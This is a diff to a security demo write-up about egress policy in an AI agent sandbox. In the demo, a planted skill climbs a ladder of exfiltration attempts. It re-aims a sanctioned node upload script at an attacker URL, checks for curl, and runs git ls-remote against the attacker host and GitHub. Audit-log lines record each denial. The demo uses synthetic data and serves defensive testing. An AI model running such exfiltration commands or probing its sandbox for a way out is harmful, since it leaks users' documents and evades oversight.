@@ -215,7 +215,8 @@ what is legitimate and swap the parameters.
 | "The tool is legit — I'll re-aim it at my bucket and send the source document" | `node ~/bin/upload-results.mjs <raw doc> <attacker URL>` | `EACCES` at `connect()` |
 | "Maybe plain curl" | `command -v curl` | no curl in the image either |
 | "Fine — git, then. I'll push the document to a repo" | `/usr/bin/git ls-remote` to the attacker bucket *and* the results server | denied at `connect()` both ways — the results-server entry names one binary: node-26 |
-| "There's a second git in /usr/sbin — maybe it has different rights" | `/usr/sbin/git ls-remote` against GitHub itself | denied at `connect()` when the twin is real; otherwise the act retires with the facts on the record |
+| "There's a second git in /usr/sbin — maybe it has different rights" | filesystem facts: `ls -ld /usr/sbin`, both inodes, both checksums | retired — `/usr/sbin -> bin`, one inode: there is no second git |
+| "Use the legitimate pairing itself — git is policy-paired with GitHub" | `/usr/bin/git ls-remote` against GitHub | denied at `connect()` — the connection comes from git's libexec helper `git-remote-http`, which no entry lists |
 
 The third row is the story's heart. The attacker did everything right by
 tool standards: the sanctioned binary, the sanctioned script, a file the
@@ -260,10 +261,31 @@ image, but `ls -l` on a file reached through a symlinked directory
 cannot distinguish a copy from the same file, so that reading was never
 proof. The demo therefore prints the filesystem facts — the `/usr/sbin`
 link state, both inodes, both checksums — and runs the beat only when
-there really are two files; in a merged-/usr image the act retires in
-the transcript with the facts on the record. A real duplicate would be
+there really are two files. In the current image that is what happens:
+`/usr/sbin` is the symlink (`/usr/sbin -> bin`), both paths share one
+inode, and the act retires with the facts on the record. A real duplicate would be
 a build bug to fix in the image — preserve the symlink — not in the
 policy: adding `/usr/sbin/git` would enshrine the mismatch.
+
+The ladder's last rung is the one the audit log wrote. Out of moves that
+reuse something legitimate, the skill tries the legitimate pairing itself:
+`/usr/bin/git` — the exact path the policy names — against GitHub, the exact
+destination it names for that path. It is denied anyway, and the denial
+record explains why: git does not make HTTP connections itself. It execs a
+libexec helper, and the audit entry names the process that actually
+connected:
+
+```text
+[1792453171.991] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/libexec/git-core/git-remote-http(0) -> host.openshell.internal:18081 [reason:transparent_tcp_policy_denied]
+```
+
+No policy entry lists `/usr/libexec/git-core/git-remote-http`, so even the
+policy-listed git cannot reach its own allowed endpoint over https — the
+`github_git` pairing is dead letter for HTTP remotes. Nothing in the current
+opencode flows shells out to git over https, so the gap is latent rather
+than live, but the lesson is the story's own thesis at the process level:
+rights attach to the identity that connects, and the identity that connects
+is not the command that was typed.
 
 ### What the document demo shows
 
@@ -271,7 +293,7 @@ policy: adding `/usr/sbin/git` would enshrine the mismatch.
 | --- | --- | --- | --- |
 | 1-2 | Sensitive documents, sanctioned tool, planted skill | (none — the victim's mistake, replayed) | All data synthetic; skill payload shown |
 | 3 | The sanctioned flow | Sanctioned `binary × endpoint` | Summary uploaded; results server counts it |
-| 4 | The skill's ladder | Per-binary, per-endpoint egress; minimal image | Denied at `connect()` (node: `EACCES`; git: libcurl connect failure); Python and curl absent; attacker count unchanged |
+| 4 | The skill's ladder | Per-binary, per-endpoint egress; minimal image | Denied at `connect()` (node: `EACCES`; git: libcurl connect failure); Python and curl absent; attacker count unchanged — and git's connects are attributed to its libexec helper |
 | 5 | — | Audit logging | `transparent_tcp_policy_denied` on the record |
 | 6 | Same network, outside the boundary | Controlled-destination contrast | Host reaches both servers; sandbox reaches only the results endpoint |
 | 6 (end) | The raw document to the *results server* | (none — and none needed; see below) | Upload succeeds, inside the perimeter |
@@ -302,6 +324,7 @@ byte leaves the host — synchronously, at `connect()`:
 connect error: EACCES
 fatal: unable to access 'http://host.openshell.internal:18081/upload/': Failed to connect to host.openshell.internal:18081 after 9 ms: Could not connect to server
 fatal: unable to access 'https://github.com/redhat-et/secure-single-server.git/': Failed to connect to github.com after 36 ms: Could not connect to server
+[1792453171.991] [sandbox] [OCSF ] [ocsf] NET:OPEN [MED] DENIED /usr/libexec/git-core/git-remote-http(0) -> host.openshell.internal:18081 [reason:transparent_tcp_policy_denied]
 ```
 
 The Python fallback dies differently — no interpreter:
@@ -380,9 +403,12 @@ not inspect content:
 - The attacker destination is a host-side controlled server
   (`openshell/tests/controlled-http.py`); no request to any real
   external attacker destination is attempted.
-- The twin-git act attempts GitHub — the one destination its
-  policy-listed twin may reach — and is denied at `connect()` before any
-  packet; no external traffic occurs.
+- The git acts attempt GitHub over https — the sbin path when the image
+  ships a real twin, and the policy-listed `/usr/bin/git` in the last
+  move — and are denied at `connect()` before any packet; no external
+  traffic occurs. Should the helper attribution ever stop holding, that
+  last move makes exactly one read-only `ls-remote` to the project's own
+  public repository before dying.
 - Every denial is asserted with the client-visible failure (node's
   `EACCES`; git's libcurl connect failure) plus an unchanged
   server-side request count — per the threat model's rule that failed
